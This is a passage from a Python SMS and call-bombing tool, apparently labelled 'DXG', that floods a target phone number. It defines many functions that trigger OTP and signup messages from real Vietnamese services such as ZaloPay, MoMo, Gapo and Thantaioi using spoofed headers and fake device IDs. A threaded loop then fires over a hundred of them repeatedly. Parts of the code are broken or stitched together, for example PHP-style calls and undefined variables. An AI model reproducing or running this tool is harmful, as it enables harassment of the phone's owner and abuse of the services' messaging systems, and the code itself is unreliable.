    json_data = {'phone_number': phone,'send_otp_token': token,}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data)

def thantaioi(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)

def oldsenmo(phone):
    response = requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]}))

def ZALOPAY(sdt):
    head = {
        "Host": "api.zalopay.vn",
        "x-platform": "NATIVE",
        "x-device-os": "ANDROID",
        "x-device-id": "690354367d96c358",
        "x-device-model": "Samsung SM-A217F",
        "x-app-version": "7.16.0",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
        "x-density": "xhdpi",
        "authorization": "Bearer",
        "x-drsite": "off",
        "accept-encoding": "gzip"
    }
    
    url = "https://api.zalopay.vn/v2/account/phone/status?phonenumber=" + sdt
    get = json.loads(CURL("GET", url, None, head, False))
    token = get["data"]["sendotptoken"]
    data = '{"phonenumber":"' + sdt + '","sendotptoken":"' + token + '"}'
    url = "https://api.zalopay.vn/v2/account/otp"
    get = json.loads(CURL("POST", url, data, head, False))

def thantaioi(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.thantaioi.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://thantaioi.vn",
        "referer: https://thantaioi.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user", data, head, False), True)
    token = get["token"]
    if token:
        head = [
            "Host: api.thantaioi.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://thantaioi.vn",
            "referer: https://thantaioi.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", None, head, False), True)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user/send-one-time-password", data, head, False), True)

def CAYDENTHAN(sdt):
    sdt = "84" + sdt
    sdt = "84" + sdt.replace("840", "")
    head = [
        "Host: api.caydenthan.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://caydenthan.vn",
        "referer: https://caydenthan.vn/",
    ]
    data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"' + sdt + '","target_url":"caydenthan.vn/"}'
    get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", data, head, false), true)
    token = get["token"]
    if token:
        head = [
            "Host: api.caydenthan.vn",
            "accept-language: vi",
            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, false), true)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, false), true)

def MONEYVEO(sdt):
    import requests
    import json
    def generateRandomString(length):
        import random
        import string
        letters = string.asciilowercase
        return ''.join(random.choice(letters) for i in range(length))
    
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/"
    }
    
    post = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)
    response = json.loads(post.content.decode('utf-8'))

def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCreditid=643e0edf695496.07498174;fptoken7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GNUSERIDKEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GNSESSIONIDKEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
    }
    post = requests.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    response = json.loads(post.content.decode('utf-8'))

def MOMO(sdt):
    head = {
        "agentid": "undefined",
        "sessionkey": "",
        "userphone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "CHECKUSERBEMSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/4.0.12",
        "appversion": "40122",
        "appcode": "4.0.12",
        "deviceos": "ANDROID"
    }
    data = {
        'user': sdt,
        'msgType': 'CHECKUSERBEMSG',
        'cmdId': microtime + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Oppo realme X Lite",
            'firmware': '23',
            'hardware': "RMX1851CN",
            'manufacture': "Oppo",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec
        },
        'extra': {
            'checkSum': ''
        }
    }
    GET = requests.post("https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json=data, headers=head)
    head = {
        "agentid": "undefined",
        "sessionkey": "",
        "userphone": "undefined",
        "authorization": "Bearer undefined",
        "msgtype": "SENDOTPMSG",
        "Host": "api.momo.vn",
        "User-Agent": "okhttp/4.0.12",
        "appversion": "40122",
        "appcode": "4.0.12",
        "deviceos": "ANDROID"
    }
    data = {
        'user': sdt,
        'msgType': 'SENDOTPMSG',
        'cmdId': microtime + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Galaxy A21s",
            'firmware': '23',
            'hardware': "SM-A217F/DS",
            'manufacture': "Samsung",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec
        },
        'extra': {
            'action': 'SEND',
            'rkey': rkey,
            'AAID': aaid,
            'IDFA': '',
            'TOKEN': token,
            'SIMULATOR': '',
            'SECUREID': sec,
            'MODELID': "Oppo RMX1851",
            'isVoice': False,
            'REQUIREHASHSTRINGOTP': True,
            'checkSum': ''
        }
    }
    GET = requests.post("https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json=data, headers=head)

def spamcall7(sdt):
    imei = generateImei()
    sec = getSECUREID()
    token = getTOKEN()
    rkey = generateRandom(20)
    aaid = generateImei()
    microtime = getmicrotime()
    head = [
        "agentid: undefined",
        "sessionkey:",
        "userphone: undefined",
        "authorization: Bearer undefined",
        "msgtype: CHECKUSERBEMSG",
        "Host: api.momo.vn",
        "User-Agent: okhttp/4.0.12",
        "appversion: 40122",
        "appcode: 4.0.12",
        "deviceos: ANDROID"
    ]
    data = {
        'user': sdt,
        'msgType': 'CHECKUSERBEMSG',
        'cmdId': str(microtime) + '000000',
        'lang': 'vi',
        'time': microtime,
        'channel': 'APP',
        'appVer': '40122',
        'appCode': '4.0.12',
        'deviceOS': 'ANDROID',
        'buildNumber': 0,
        'appId': 'vn.momo.platform',
        'result': True,
        'errorCode': 0,
        'errorDesc': '',
        'momoMsg': {
            'class': 'mservice.backend.entity.msg.RegDeviceMsg',
            'number': sdt,
            'imei': imei,
            'cname': 'Vietnam',
            'ccode': '084',
            'device': "Oppo realme X Lite",
            'firmware': '23',
            'hardware': "RMX1851CN",
            'manufacture': "Oppo",
            'csp': '',
            'icc': '',
            'mcc': '452',
            'deviceos': 'Android',
            'secureid': sec,
        },
        'extra': {
            'checkSum': '',
        },
    }
    GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECKUSERBEMSG", json.dumps(data), head, False)


def SWIFT247(sdt):
    url = "https://api.swift247.vn/v1/checkphone"
    headers = {
        "Host": "api.swift247.vn",
        "content-length": "23",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "Android",
        "origin": "https://app.swift247.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.swift247.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    response = requests.post(url, headers=headers, data=json.dumps(postdata))
    
    if "OTPNOCONFIRMED" in response.text:
        url = "https://api.swift247.vn/v1/requestnewotp"
        response = requests.post(url, headers=headers, data=json.dumps(postdata))

def spamcall(sdt):
    headers = {
        "Host": "api.thantaioi.vn",
        "accept-language": "vi",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "/",
        "origin": "https://thantaioi.vn",
        "referer": "https://thantaioi.vn/"
    }
    
    data = {
        "fullname": "Khang pro",
        "firstname": "pro",
        "lastname": "Khang",
        "mobilephone": sdt,
        "targeturl": "caydenthan.vn/"
    }
    
    response = requests.post("https://api.thantaioi.vn/api/user", data=json.dumps(data), headers=headers)
    get = json.loads(response.text)
    token = get["token"]
    
    if token:
        headers = {
            "Host": "api.thantaioi.vn",
            "accept-language": "vi",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type": "application/json",
            "authorization": "Bearer " + token,
            "accept": "*/*",
            "origin": "https://thantaioi.vn",
            "referer": "https://thantaioi.vn/"
        }
        
        response = requests.get("https://api.thantaioi.vn/api/user/phone-confirmation-code", headers=headers)

def KILO(sdt):
    headers = {
        "Host": "api.kilo.vn",
        "content-length": "54",
        "app-version": "1",
        "x-correlation-id": "d5afa9c6-73cb-47bf-ad42-0672912b725b",
        "sec-ch-ua-mobile": "?1",
        "authorization": "Bearer undefined",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "i18next-language": "vi",
        "api-version": "2",
        "platform": "SELLERWEB",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://seller.kilo.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://seller.kilo.vn/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    email = randomstring(6) + "@gmail.com" # Email đăng ký tài khoản
    data = json.dumps({"phone": sdt, "email": email})
    
    response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)
    result = response.json()

def GAPO(sdt):
    headers = {
        "Host": "api.gapo.vn",
        "Content-Length": "31",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?1",
        "Authorization": "Bearer",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Accept": "*/*",
        "Origin": "https://www.gapo.vn",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.gapo.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    data = {
        "device_id": "30a1bfa0-533f-45e9-be60-b48fb8977df2",
        "phone_number": "+84-" + sdt[1:11],
        "otp_type": 0
    }
    
    response = requests.post("https://api.gapo.vn/auth/v2.0/signup", headers=headers, data=json.dumps(data))

                                                                 
def run(sdt,i):                  
  threading.submit(tv360,sdt)#1
  threading.submit(winmart,sdt)#2
  threading.submit(apispam,sdt)#3
  threading.submit(vieon,sdt)#4
  threading.submit(poyeye,sdt)#5
  threading.submit(alfrescos,sdt)#6
  threading.submit(fpt,sdt)#7
  threading.submit(kiot,sdt)#8
  threading.submit(vayvnd,sdt)#9
  threading.submit(viettel,sdt)#10
  threading.submit(tamo,sdt)#11 
  threading.submit(meta,sdt)#12
  threading.submit(funring,sdt)#13
  threading.submit(dkvt,sdt)#14
  threading.submit(fptplay,sdt)
  threading.submit(vietid,sdt)
  threading.submit(zlpay,sdt) 
  threading.submit(momo,sdt) 
  threading.submit(fpt,sdt)
  threading.submit(call3,sdt)
  threading.submit(call2,sdt)
  threading.submit(call1,sdt)
  threading.submit(call4,sdt)
  threading.submit(call5,sdt)
  threading.submit(call9,sdt)
  threading.submit(concung,sdt)
  threading.submit(cafeland,sdt)
  threading.submit(moneydong,sdt)
  threading.submit(call10,sdt)
  threading.submit(funring,sdt)
  threading.submit(gotadi,sdt)
  threading.submit(call11,sdt)
  threading.submit(fptplay,sdt)
  threading.submit(vietid,sdt)
  threading.submit(ahamove,sdt)
  threading.submit(vieon1,sdt)
  threading.submit(tiki,sdt)
  threading.submit(apiv5,sdt)
  threading.submit(moca,sdt)
  threading.submit(gbay,sdt)
  threading.submit(tgdd,sdt)
  threading.submit(dkvt,sdt)
  threading.submit(viettel,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt)
  threading.submit(PHUCLONG,sdt)
  threading.submit(VIETLOTT,sdt)
  threading.submit(CONCUNG,sdt)
  threading.submit(GOTADI,sdt)
  threading.submit(VIETID,sdt)
  threading.submit(VAMO,sdt)
  threading.submit(OLDFACEBOOK,sdt)
  threading.submit(FUNRING,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(moneydong,sdt)
  threading.submit(VAYSIEUDE,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(VAYVND,sdt)
  threading.submit(findo,sdt)
  threading.submit(AHAMOVE,sdt)
  threading.submit(TV360,sdt)
  threading.submit(POPS,sdt)
  threading.submit(F88,sdt)
  threading.submit(TIENOI,sdt)
  threading.submit(DONGPLUS,sdt)
  threading.submit(VIEON,sdt)
  threading.submit(FPTPLAY,sdt)
  threading.submit(ALFRESCOS,sdt)
  threading.submit(PIZZAHUT,sdt)
  threading.submit(SELLY,sdt)
  threading.submit(KIDSPLAZA,sdt)
  threading.submit(ICANKID,sdt) 
  threading.submit(RIVIU,sdt)
  threading.submit(VOSO,sdt)
  threading.submit(THITRUONGSI,sdt)
  threading.submit(BATDONGSAN,sdt)
  threading.submit(KIOTVIET,sdt)
  threading.submit(BIBABO,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt)
  threading.submit(PHUCLONG,sdt)
  threading.submit(VIETLOTT,sdt)
  threading.submit(GOTADI,sdt)
  threading.submit(VAMO,sdt)
  threading.submit(OLDFACEBOOK,sdt)
  threading.submit(WINMART,sdt)
  threading.submit(FUNRING,sdt)
  threading.submit(THANTAIOI,sdt)
  threading.submit(THANTAIOI,sdt)
  threading.submit(AHAMOVE,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(CAFELAND,sdt)
  threading.submit(DAIHOCFPT,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(FINDO,sdt)
  threading.submit(MONEYVEO,sdt)
  threading.submit(VAYVND,sdt)
  threading.submit(LOSHIP,sdt)
  threading.submit(TUOITRE,sdt) 
  threading.submit(DONGPLUS,sdt)
  threading.submit(F88,sdt)
  threading.submit(TIENOI,sdt)
  threading.submit(VIETTELL,sdt)
  threading.submit(META,sdt)
  threading.submit(TAMO,sdt)
  threading.submit(MOMO,sdt)
  threading.submit(apiv3,sdt)
  threading.submit(apiv2,sdt)
  threading.submit(tgdd,sdt)
  threading.submit(apiv5,sdt)
  threading.submit(tiki,sdt)
  threading.submit(moca,sdt)
  threading.submit(gbay,sdt)
  threading.submit(vieon1,sdt)
  threading.submit(ahamove,sdt)
  threading.submit(call11,sdt)
  threading.submit(call1,sdt)
  threading.submit(call2,sdt)
  threading.submit(call4,sdt)
  threading.submit(call5,sdt)
  threading.submit(call9,sdt)
  threading.submit(zlpay,sdt)
  threading.submit(vntrip,sdt)
  threading.submit(pop,sdt)
  threading.submit(poy,sdt)
  threading.submit(alfres,sdt)
  threading.submit(tv360,sdt)
  threading.submit(loship,sdt)
  threading.submit(oldloship,sdt)
  threading.submit(fpt,sdt)
  threading.submit(f88,sdt)
  threading.submit(oldzalopay,sdt)
  threading.submit(thantaioi,sdt)
  threading.submit(oldsenmo,sdt)   
  threading.submit(ZALOPAY,sdt) 
  threading.submit(thantaioi,sdt)
  threading.submit(CAYDENTHAN,sdt)
  threading.submit(MONEYVEO,sdt)
  threading.submit(ONCREDIT,sdt)
  threading.submit(MOMO,sdt)
  threading.submit(spamcall7,sdt)
  threading.submit(SWIFT247,sdt)
  threading.submit(spamcall,sdt)
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt) 
  print("\x1b[38;5;160m[ \x1b[38;5;255mDXG\x1b[38;5;160m ] Send Sms - Call | \x1b[38;5;255mApi - Free\x1b[38;5;160m | Delay : \x1b[38;5;255m5\x1b[38;5;160m | Status : \x1b[38;5;255mCompleted\x1b[38;5;160m ",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f"                          D4XG API \r",end="")
    
for i in range(1,count+1):
  run(sdt,i)
 
